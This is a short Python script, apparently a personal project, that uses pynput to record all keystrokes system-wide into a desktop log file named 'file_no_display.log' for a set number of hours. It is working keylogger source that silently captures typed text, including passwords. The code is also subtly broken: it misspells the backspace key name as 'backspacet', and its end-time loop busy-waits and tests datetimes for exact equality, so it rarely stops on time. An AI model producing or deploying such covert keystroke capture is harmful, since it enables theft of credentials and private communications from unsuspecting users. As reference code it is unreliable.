from pynput.keyboard import Key, Listener
import logging
import datetime
import sys

log_file='/home/bertrand/Desktop/file_no_display.log'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
message = ""
# stop = False

def on_press(key):
    global message
    if (hasattr(key, 'name')):
        if key.name == 'space':
            message += " "
        elif key.name == 'enter':
            #if key pressed is enter
            logging.info(message)
            if message == "end session":
                exit(0)
            message = ""
        elif key.name == 'backspacet':
            message = message[:-1]
        else:
            #TODO : handle ctrl and alt
            logging.info(message)
            logging.info(key.name)
            message = ""
    else:
        if not key.char and key.vk == 65027:
            return
        message += key.char

def main(time):
    start = datetime.datetime.now()
    duration = datetime.timedelta(hours=int(time))
    end = start + duration
    current = datetime.datetime.now()
    listener = Listener(on_press=on_press)
    listener.start()
    while current != end:
        current = datetime.datetime.now()

main(sys.argv[1])